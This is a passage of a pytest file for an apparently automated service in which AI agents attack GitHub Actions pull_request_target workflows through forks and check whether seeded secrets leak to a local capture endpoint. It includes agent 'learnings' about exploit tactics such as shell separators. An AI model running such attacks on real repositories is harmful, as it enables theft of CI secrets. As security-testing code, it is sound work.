            "  pull_request_target:\n"
            "    branches:\n"
            "      - release/*\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo test\n"
        ),
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace,
        default_branch="main",
        focused_workflow=".github/workflows/ci.yml",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result.get("needs_human_review") is not True
    assert user_b_client.created_pr_payload is not None
    assert user_b_client.created_pr_payload["base"].startswith("release/")
    assert sandbox.checked_out is True
    assert len(user_a_client.created_branches) == 1
    created_repo, created_branch, created_sha = user_a_client.created_branches[0]
    assert created_repo == "playground/repo"
    assert created_sha == "abc123"
    assert created_branch.startswith("release/")
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_monitors_pr_base_repo_from_create_response(tmp_path: Path) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")

    class _PRBaseAwareClient(_ExecuteGitHubClient):
        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            return {
                "number": 42,
                "html_url": "https://github.com/playground/repo/pull/42",
                "base": {"repo": {"full_name": "playground/repo"}},
            }

    user_b_client = _PRBaseAwareClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    captured: dict[str, object] = {}

    def _fake_monitor_workflow(**kwargs):
        captured["repo_name"] = kwargs["repo_name"]
        return {"vulnerable": False}

    service._monitor_workflow = _fake_monitor_workflow  # type: ignore[method-assign]

    service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert captured["repo_name"] == "playground/repo"


def test_execute_attack_returns_execution_error_on_pr_base_owner_mismatch(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")

    class _MismatchedPRBaseOwnerClient(_ExecuteGitHubClient):
        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            return {
                "number": 42,
                "html_url": "https://github.com/other-owner/repo/pull/42",
                "base": {"repo": {"full_name": "other-owner/repo"}},
            }

    user_b_client = _MismatchedPRBaseOwnerClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["status"] == "execution_error"
    assert result["error_class"] == "owner_token_mismatch"
    assert result["failure_fingerprint"] == "owner_token_mismatch"


def test_execute_attack_reuses_existing_pr_after_422_validation_failure(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")

    class _CreateFailsThenFindsOpenPRClient(_ExecuteGitHubClient):
        def __init__(self, token: str) -> None:
            super().__init__(token)
            self.list_calls = 0

        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            raise GitHubApiError(
                "GitHub API request failed for /repos/playground/repo/pulls: "
                "422 Validation Failed: A pull request already exists"
            )

        def list_pull_requests(
            self,
            repo_name: str,
            state: str = "open",
            head: str | None = None,
            base: str | None = None,
        ) -> list[dict[str, object]]:
            _ = (repo_name, state, head, base)
            self.list_calls += 1
            return [
                {
                    "number": 99,
                    "html_url": "https://github.com/playground/repo/pull/99",
                    "base": {"repo": {"full_name": "playground/repo"}},
                }
            ]

    user_b_client = _CreateFailsThenFindsOpenPRClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    captured: dict[str, object] = {}

    def _fake_monitor_workflow(**kwargs):
        captured["pr_number"] = kwargs["pr_number"]
        return {"vulnerable": False}

    service._monitor_workflow = _fake_monitor_workflow  # type: ignore[method-assign]

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["pull_request_url"] == "https://github.com/playground/repo/pull/99"
    assert captured["pr_number"] == 99
    assert user_b_client.list_calls == 1


def test_execute_attack_returns_non_vulnerable_when_pr_has_no_commits(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")

    class _NoCommitsPRClient(_ExecuteGitHubClient):
        def __init__(self, token: str) -> None:
            super().__init__(token)
            self.create_calls = 0

        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            self.create_calls += 1
            raise GitHubApiError(
                "GitHub API request failed for /repos/playground/repo/pulls: "
                "422 Validation Failed: No commits between base and head"
            )

    user_b_client = _NoCommitsPRClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path.parent / "agent-task.md").write_text(
        "initial prompt\n",
        encoding="utf-8",
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert "no commits between" in result["reason"].lower()
    assert user_b_client.create_calls == 3
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_requests_human_review_when_pr_head_is_invalid(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")

    class _InvalidPRClient(_ExecuteGitHubClient):
        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            raise GitHubApiError(
                "GitHub API request failed for /repos/playground/repo/pulls: "
                "422 Validation Failed (PullRequest.head.invalid)"
            )

    user_b_client = _InvalidPRClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert "head as invalid" in result["reason"]
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_requests_human_review_when_pr_base_is_invalid(
    tmp_path: Path,
) -> None:
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")

    class _InvalidPRBaseClient(_ExecuteGitHubClient):
        def create_pull_request(
            self,
            repo_name: str,
            title: str,
            body: str,
            head: str,
            base: str,
        ) -> dict[str, object]:
            _ = (repo_name, title, body, head, base)
            raise GitHubApiError(
                "GitHub API request failed for /repos/playground/repo/pulls: "
                "422 Validation Failed (PullRequest.base.invalid)"
            )

    user_b_client = _InvalidPRBaseClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert result["needs_human_review"] is True
    assert result["status"] == "human_review_required"
    assert "base as invalid" in result["reason"]
    assert result["controller_signal"]["status"] == "needs_human_review"
    assert sandbox.stopped is True
    assert sandbox.removed is True


def test_execute_attack_blocks_if_user_b_parent_is_not_user_a(tmp_path: Path) -> None:
    class _InvalidChainExecuteGitHubClient(_ExecuteGitHubClient):
        def get_repo_metadata(self, repo_name: str) -> dict[str, str]:
            parent_full_name = ""
            if repo_name == "playground/repo":
                parent_full_name = "owner/repo"
            elif repo_name == "attacker/repo":
                parent_full_name = "owner/repo"
            return {
                "name": repo_name,
                "created_at": "2024-01-01T00:00:00Z",
                "default_branch": "main",
                "parent_full_name": parent_full_name,
            }

    service = AttackExecutionService(
        github_client_factory=lambda token: _InvalidChainExecuteGitHubClient(token),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(_ExecuteSandbox()),
    )

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=tmp_path / "workspace",
        default_branch="main",
        repo_name="owner/repo",
    )

    assert result["vulnerable"] is False
    assert "not directly forked from User A fork" in result["reason"]


def test_persist_run_level_learning_appends_unique_entry(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = (
        tmp_path
        / "attack-artifacts"
        / "20260323T000000Z"
        / "owner__repo-a"
        / "risks"
        / "risk-000-first"
        / "workspace"
    )
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"learning": "Prefer changing workflow-triggered paths first."}),
        encoding="utf-8",
    )

    service._persist_run_level_learning(  # noqa: SLF001
        workspace_path=workspace_path,
        repository_name="owner/repo-a",
    )
    service._persist_run_level_learning(  # noqa: SLF001
        workspace_path=workspace_path,
        repository_name="owner/repo-b",
    )

    learnings_path = workspace_path.parents[3] / "LEARNINGS.md"
    learnings = learnings_path.read_text(encoding="utf-8")
    workspace_learnings_path = workspace_path / "LEARNINGS.md"

    assert learnings.startswith("# Learnings")
    assert (
        learnings.count("Prefer changing workflow-triggered paths first.") == 1
    )
    assert (
        "- [owner/repo-a] Prefer changing workflow-triggered paths first."
        in learnings
    )
    assert workspace_learnings_path.exists()
    assert workspace_learnings_path.read_text(encoding="utf-8") == learnings


def test_collect_and_persist_learning_after_success_clears_stale_and_persists_new_entry(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        agent_provider="gemini-cli",
    )
    workspace_path = (
        tmp_path
        / "attack-artifacts"
        / "20260323T000000Z"
        / "owner__repo-a"
        / "risks"
        / "risk-000-first"
        / "workspace"
    )
    workspace_path.mkdir(parents=True, exist_ok=True)
    agent_output_path = workspace_path / "agent-output.json"
    agent_output_path.write_text(
        json.dumps({"learning": "stale wrong learning"}),
        encoding="utf-8",
    )

    def fake_prompt(**_kwargs):
        agent_output_path.write_text(
            json.dumps({"learning": "Prefer changing workflow-triggered paths first."}),
            encoding="utf-8",
        )

    service._prompt_gemini_for_success_learning = fake_prompt  # type: ignore[method-assign]

    service._collect_and_persist_learning_after_success(  # noqa: SLF001
        workspace_path=workspace_path,
        repository_name="owner/repo-a",
        timeout=30,
        git_token="token-b",
    )

    learnings_path = workspace_path.parents[3] / "LEARNINGS.md"
    learnings = learnings_path.read_text(encoding="utf-8")
    assert "stale wrong learning" not in learnings
    assert "Prefer changing workflow-triggered paths first." in learnings


def test_collect_and_persist_learning_after_success_skips_non_gemini(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "repo-ws"
    workspace_path.mkdir(parents=True, exist_ok=True)
    agent_output_path = workspace_path / "agent-output.json"
    agent_output_path.write_text(
        json.dumps({"learning": "should be cleared"}),
        encoding="utf-8",
    )

    service._collect_and_persist_learning_after_success(  # noqa: SLF001
        workspace_path=workspace_path,
        repository_name="owner/repo-a",
        timeout=30,
        git_token="token-b",
    )

    payload = json.loads(agent_output_path.read_text(encoding="utf-8"))
    assert payload["learning"] == ""
    assert not (tmp_path / "LEARNINGS.md").exists()


def test_prepare_openhands_prompt_preserves_workspace_agent_output(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path.parent / "agent-task.md").write_text(
        "prompt from artifact",
        encoding="utf-8",
    )
    (workspace_path.parent / "agent-output.json").write_text(
        json.dumps({"vulnerable": "unconfirmed", "human_review_needed": False}),
        encoding="utf-8",
    )
    (workspace_path / "agent-output.json").write_text(
        json.dumps({"vulnerable": "yes", "human_review_needed": False}),
        encoding="utf-8",
    )

    service._prepare_openhands_prompt_in_workspace(workspace_path)  # noqa: SLF001

    workspace_prompt = (workspace_path / "agent-task.md").read_text(encoding="utf-8")
    assert workspace_prompt.startswith("prompt from artifact")
    assert "Workspace Secrets Notes" in workspace_prompt
    assert json.loads(
        (workspace_path / "agent-output.json").read_text(encoding="utf-8")
    ) == {"vulnerable": "yes", "human_review_needed": False}


def test_prepare_openhands_prompt_injects_workspace_learnings(tmp_path: Path) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = (
        tmp_path
        / "attack-artifacts"
        / "20260323T000000Z"
        / "owner__repo"
        / "risks"
        / "risk-000-first"
        / "workspace"
    )
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path.parent / "agent-task.md").write_text(
        "prompt from artifact",
        encoding="utf-8",
    )
    run_level_learnings = (
        "# Learnings\n\n"
        "- [owner/repo-a] Validate path filter matches before retrying.\n"
    )
    (workspace_path.parents[3] / "LEARNINGS.md").write_text(
        run_level_learnings,
        encoding="utf-8",
    )

    service._prepare_openhands_prompt_in_workspace(workspace_path)  # noqa: SLF001

    assert (
        (workspace_path / "LEARNINGS.md").read_text(encoding="utf-8")
        == run_level_learnings
    )
    workspace_prompt = (workspace_path / "agent-task.md").read_text(encoding="utf-8")
    assert "Read `LEARNINGS.md` in the workspace before continuing." in workspace_prompt


def test_prepare_agent_prompt_overwrites_gemini_md_from_learnings(tmp_path: Path) -> None:
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        agent_provider="gemini-cli",
    )
    workspace_path = (
        tmp_path
        / "attack-artifacts"
        / "20260323T000000Z"
        / "owner__repo"
        / "risks"
        / "risk-000-first"
        / "workspace"
    )
    workspace_path.mkdir(parents=True, exist_ok=True)
    (workspace_path.parent / "agent-task.md").write_text(
        "prompt from artifact",
        encoding="utf-8",
    )
    (workspace_path.parents[3] / "LEARNINGS.md").write_text(
        "# Learnings\n\n- [owner/repo-a] Reuse successful local exploit command.\n",
        encoding="utf-8",
    )
    (workspace_path / "GEMINI.md").write_text("outdated context", encoding="utf-8")

    service._prepare_agent_prompt_in_workspace(workspace_path)  # noqa: SLF001

    assert (workspace_path / "GEMINI.md").read_text(encoding="utf-8") == (
        "# Learnings\n\n"
        "- [owner/repo-a] Reuse successful local exploit command.\n"
    )
    assert (workspace_path / "LEARNINGS.md").read_text(encoding="utf-8") == (
        "# Learnings\n\n"
        "- [owner/repo-a] Reuse successful local exploit command.\n"
    )


def test_prepare_agent_prompt_copies_structured_learnings_into_workspace_and_gemini_md(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(
        github_client_factory=lambda _token: object(),
        agent_provider="gemini-cli",
    )
    workspace_path = (
        tmp_path
        / "attack-artifacts"
        / "20260323T000000Z"
        / "owner__repo"
        / "risks"
        / "risk-000-first"
        / "workspace"
    )
    workspace_path.mkdir(parents=True, exist_ok=True)
    structured_learnings = (
        "# Learnings\n\n"
        "### General Tactics\n\n"
        "* Use fallback shell separators.\n"
    )
    (workspace_path.parents[3] / "LEARNINGS.md").write_text(
        structured_learnings,
        encoding="utf-8",
    )

    service._prepare_agent_prompt_in_workspace(workspace_path)  # noqa: SLF001

    assert (workspace_path / "LEARNINGS.md").read_text(encoding="utf-8") == (
        structured_learnings
    )
    assert (workspace_path / "GEMINI.md").read_text(encoding="utf-8") == (
        structured_learnings
    )


def test_prepare_openhands_prompt_writes_local_test_files_from_controller_context(
    tmp_path: Path, isolated_local_secrets_template: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    service._active_local_test_setup = {  # noqa: SLF001
        "user_b_token": "token-b",
        "user_a_fork": "playground/repo",
        "user_b_fork": "attacker/repo",
        "pr_base_branch": "master",
        "focused_workflow": ".github/workflows/ci.yml",
        "head_ref": "feature/temp-change-1",
    }

    service._prepare_openhands_prompt_in_workspace(workspace_path)  # noqa: SLF001

    expected_secrets = isolated_local_secrets_template.read_text(encoding="utf-8").replace("{{GITHUB_TOKEN}}", "token-b")
    assert (workspace_path / ".secrets").read_text(encoding="utf-8").strip() == expected_secrets.strip()
    event_payload = json.loads((workspace_path / "event.json").read_text(encoding="utf-8"))
    assert event_payload["pull_request"]["base"]["ref"] == "master"
    assert event_payload["pull_request"]["base"]["repo"]["full_name"] == "playground/repo"
    assert event_payload["pull_request"]["head"]["repo"]["full_name"] == "attacker/repo"
    assert (workspace_path / ".runner.env").read_text(encoding="utf-8") == (
        "CI=true\n"
        "IS_RUNNING_IN_ACT=true\n"
        "GITHUB_ACTOR=attacker\n"
        "GITHUB_REPOSITORY=playground/repo\n"
        "GITHUB_API_URL=https://api.github.com\n"
        "GITHUB_REPOSITORY_OWNER=playground\n"
    )
    test_script = (workspace_path / "test-exploit-locally.py").read_text(encoding="utf-8")
    assert 'WORKFLOW_FILE = Path(".github/workflows/ci.yml")' in test_script
    assert '"--secret-file",' in test_script
    assert "str(SECRETS_FILE)" in test_script
    assert (workspace_path / ".actrc").read_text(encoding="utf-8") == (
        "-P ubuntu-latest=ghcr.io/catthehacker/ubuntu:full-24.04\n"
        "-P ubuntu-24.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
        "-P ubuntu-22.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
        "-P ubuntu-20.04=ghcr.io/catthehacker/ubuntu:full-24.04\n"
    )


def test_prepare_openhands_prompt_merges_seeded_dummy_secrets_without_overwriting_existing_values(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    service._active_local_test_setup = {  # noqa: SLF001
        "user_b_token": "token-b",
        "user_a_fork": "playground/repo",
        "user_b_fork": "attacker/repo",
        "pr_base_branch": "master",
        "focused_workflow": ".github/workflows/ci.yml",
        "head_ref": "feature/temp-change-1",
        "seeded_secrets": ["FERN_TOKEN", "EXTRA_SECRET"],
        "user_a_token": "token-a",
    }

    service._prepare_openhands_prompt_in_workspace(workspace_path)  # noqa: SLF001

    workspace_secrets = (workspace_path / ".secrets").read_text(encoding="utf-8")
    assert "GITHUB_TOKEN=token-b" in workspace_secrets
    assert "EXTRA_SECRET=flag{extra-secret}" in workspace_secrets
    assert "FERN_TOKEN=flag{fern-token}" not in workspace_secrets
    assert "FERN_TOKEN=synthetic-existing-fern" in workspace_secrets


def test_prepare_openhands_prompt_overlays_shared_secret_snapshot(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workspace_path.mkdir(parents=True, exist_ok=True)
    shared_secrets_state_path = tmp_path / "shared-secrets.json"
    shared_secrets_state_path.write_text(
        json.dumps(
            {
                "FERN_TOKEN": "shared-fern",
                "CUSTOM_SECRET": "shared-custom",
                "GITHUB_TOKEN": "should-not-carry-over",
            }
        ),
        encoding="utf-8",
    )
    service._active_local_test_setup = {  # noqa: SLF001
        "user_b_token": "token-c",
        "user_a_fork": "playground/repo",
        "user_b_fork": "attacker/repo",
        "pr_base_branch": "master",
        "focused_workflow": ".github/workflows/ci.yml",
        "head_ref": "feature/temp-change-2",
        "seeded_secrets": ["FERN_TOKEN", "EXTRA_SECRET"],
        "shared_secrets_state_path": str(shared_secrets_state_path),
    }

    service._prepare_openhands_prompt_in_workspace(workspace_path)  # noqa: SLF001

    workspace_secrets = (workspace_path / ".secrets").read_text(encoding="utf-8")
    assert "GITHUB_TOKEN=token-c" in workspace_secrets
    assert "GITHUB_TOKEN=should-not-carry-over" not in workspace_secrets
    assert "FERN_TOKEN=shared-fern" in workspace_secrets
    assert "CUSTOM_SECRET=shared-custom" in workspace_secrets
    assert "EXTRA_SECRET=flag{extra-secret}" in workspace_secrets


def test_execute_attack_syncs_agent_edited_workspace_secrets_to_user_a_fork(
    monkeypatch,
    tmp_path: Path,
) -> None:
    workspace_path = tmp_path / "workspace"
    shared_secrets_state_path = tmp_path / "shared-secrets.json"
    sandbox = _ExecuteSandbox()
    user_a_client = _ExecuteGitHubClient("token-a")
    user_b_client = _ExecuteGitHubClient("token-b")
    service = AttackExecutionService(
        github_client_factory=lambda token: (
            user_a_client if token == "token-a" else user_b_client
        ),
        hookbin_client=_ExecuteHookbinClient(),
        sandbox_manager=_ExecuteSandboxManager(sandbox),
    )
    service._monitor_workflow = lambda **kwargs: {"vulnerable": False}  # type: ignore[method-assign]

    def fake_run_agent_with_fallback(**kwargs):
        workspace = kwargs["workspace_path"]
        secrets_path = workspace / ".secrets"
        content = secrets_path.read_text(encoding="utf-8")
        content = content.replace(
            "FERN_TOKEN=synthetic-existing-fern",
            "FERN_TOKEN=agent-overridden-fern",
        )
        if not content.endswith("\n"):
            content += "\n"
        content += "NEW_WORKFLOW_SECRET=agent-secret\n"
        secrets_path.write_text(content, encoding="utf-8")
        return {"ok": True, "exit_code": 0}

    monkeypatch.setattr(service, "_run_agent_with_fallback", fake_run_agent_with_fallback)

    result = service.execute_attack(
        user_a_token="token-a",
        user_b_token="token-b",
        user_a_fork="playground/repo",
        user_b_fork="attacker/repo",
        workspace_path=workspace_path,
        default_branch="main",
        repo_name="owner/repo",
        focused_workflow=".github/workflows/ci.yml",
        shared_secrets_state_path=shared_secrets_state_path,
    )

    assert result["vulnerable"] is False
    assert ("playground/repo", "FERN_TOKEN", "agent-overridden-fern") in (
        user_a_client.set_actions_secret_calls
    )
    assert ("playground/repo", "NEW_WORKFLOW_SECRET", "agent-secret") in (
        user_a_client.set_actions_secret_calls
    )
    shared_secrets = json.loads(shared_secrets_state_path.read_text(encoding="utf-8"))
    assert shared_secrets["FERN_TOKEN"] == "agent-overridden-fern"
    assert shared_secrets["NEW_WORKFLOW_SECRET"] == "agent-secret"
    assert "GITHUB_TOKEN" not in shared_secrets


def test_validate_pr_target_blocks_exploit_pr_to_source_repo() -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())

    error = service._validate_pr_target(  # noqa: SLF001
        source_repo="owner/repo",
        target_repo="owner/repo",
        user_a_fork="playground/repo",
        purpose="exploit",
    )

    assert error is not None
    assert "must never target the source repository" in error


def test_resolve_pr_base_branch_uses_default_when_workflow_has_no_branch_filter(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workflow_path = workspace_path / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        "on:\n  pull_request_target:\n    types: [opened]\n",
        encoding="utf-8",
    )

    branch = service._resolve_pr_base_branch_from_workspace(  # noqa: SLF001
        workspace_path=workspace_path,
        focused_workflow=".github/workflows/ci.yml",
        default_branch="main",
    )

    assert branch == "main"


def test_resolve_pr_base_branch_uses_default_when_filter_matches_default(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workflow_path = workspace_path / ".github/workflows/ci.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "on:\n"
            "  pull_request_target:\n"
            "    branches:\n"
            "      - main\n"
            "      - release/*\n"
        ),
        encoding="utf-8",
    )

    branch = service._resolve_pr_base_branch_from_workspace(  # noqa: SLF001
        workspace_path=workspace_path,
        focused_workflow=".github/workflows/ci.yml",
        default_branch="main",
    )

    assert branch == "main"


def test_resolve_pr_base_branch_uses_first_filtered_branch_when_default_not_allowed(
    tmp_path: Path,
) -> None:
    service = AttackExecutionService(github_client_factory=lambda _token: object())
    workspace_path = tmp_path / "workspace"
    workflow_path = workspace_path / ".github/workflows/summary.yml"
    workflow_path.parent.mkdir(parents=True, exist_ok=True)
    workflow_path.write_text(
        (
            "on:\n"
            "  pull_request_target:\n"
            "    branch:\n"
            "      - master\n"
            "      - release/*\n"
        ),
        encoding="utf-8",
    )

    branch = service._resolve_pr_base_branch_from_workspace(  # noqa: SLF001
        workspace_path=workspace_path,
        focused_workflow=".github/workflows/summary.yml",
        default_branch="main",
    )

    assert branch == "master"


class _MultiRunMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        self.get_workflow_runs_calls += 1
        if self.get_workflow_runs_calls == 1:
            return {
                "workflow_runs": [
                    {
                        "id": 101,
                        "head_sha": "abc123",
                        "status": "in_progress",
                        "conclusion": None,
                        "pull_requests": [{"number": 42}],
                    }
                ]
            }
        if self.get_workflow_runs_calls == 2:
            return {
                "workflow_runs": [
                    {
                        "id": 101,
                        "head_sha": "abc123",
                        "status": "completed",
                        "conclusion": "success",
                        "pull_requests": [{"number": 42}],
                    },
                    {
                        "id": 202,
                        "head_sha": "abc123",
                        "status": "in_progress",
                        "conclusion": None,
                        "pull_requests": [{"number": 42}],
                    },
                ]
            }
        return {
            "workflow_runs": [
                {
                    "id": 101,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "pull_requests": [{"number": 42}],
                },
                {
                    "id": 202,
                    "head_sha": "abc123",
                    "status": "completed",
                    "conclusion": "success",
                    "pull_requests": [{"number": 42}],
                },
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        return b""


class _HookbinNoLogsTracker:
    base_url = "http://127.0.0.1:8787"

    def __init__(self) -> None:
        self.checked_bin_ids: list[str] = []

    def get_logs_as_text(self, bin_id: str) -> str:
        self.checked_bin_ids.append(bin_id)
        return ""

class _HookbinDelayedLogsTracker(_HookbinNoLogsTracker):
    def __init__(self) -> None:
        super().__init__()
        self.waited_bin_ids: list[str] = []

    def wait_for_logs_as_text(
        self,
        bin_id: str,
        timeout: float = 300.0,
        poll_interval: float = 5.0,
    ) -> str:
        _ = (timeout, poll_interval)
        self.waited_bin_ids.append(bin_id)
        return "delayed-secret"


class _HookbinImmediateLogsTracker(_HookbinNoLogsTracker):
    def get_logs_as_text(self, bin_id: str) -> str:
        self.checked_bin_ids.append(bin_id)
        return "immediate-secret"


class _HookbinSelectiveLogsTracker(_HookbinNoLogsTracker):
    def __init__(self, vulnerable_bin_id: str) -> None:
        super().__init__()
        self._vulnerable_bin_id = vulnerable_bin_id

    def get_logs_as_text(self, bin_id: str) -> str:
        self.checked_bin_ids.append(bin_id)
        if bin_id == self._vulnerable_bin_id:
            return "secret-from-older-head"
        return ""


class _HookbinEmptyBodyCallsTracker(_HookbinNoLogsTracker):
    def __init__(self) -> None:
        super().__init__()
        self._calls_by_bin: dict[str, list[dict[str, object]]] = {
            "909": [{"method": "GET", "bodyText": None}]
        }

    def get_logs(self, bin_id: str) -> list[dict[str, object]]:
        self.checked_bin_ids.append(bin_id)
        return self._calls_by_bin.get(bin_id, [])

    def get_logs_as_text(self, bin_id: str) -> str:
        _ = self.get_logs(bin_id)
        return ""


class _InProgressOnlyMonitorClient:
    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
        _ = (repo_name, pull_number)
        return {"head": {"sha": "abc123"}}

    def get_workflow_runs(
        self,
        repo_name: str,
        branch: str | None = None,
        status: str | None = None,
        per_page: int = 30,
        page: int = 1,
    ) -> dict[str, object]:
        _ = (repo_name, branch, status, per_page, page)
        return {
            "workflow_runs": [
                {
                    "id": 909,
                    "head_sha": "abc123",
                    "status": "in_progress",
                    "conclusion": None,
                    "pull_requests": [{"number": 42}],
                }
            ]
        }

    def download_workflow_run_logs(self, repo_name: str, run_id: int) -> bytes:
        _ = (repo_name, run_id)
        return b""


class _SetUpJobFailureMonitorClient:
    def __init__(self) -> None:
        self.get_workflow_runs_calls = 0

    def get_pull_request(self, repo_name: str, pull_number: int) -> dict[str, object]:
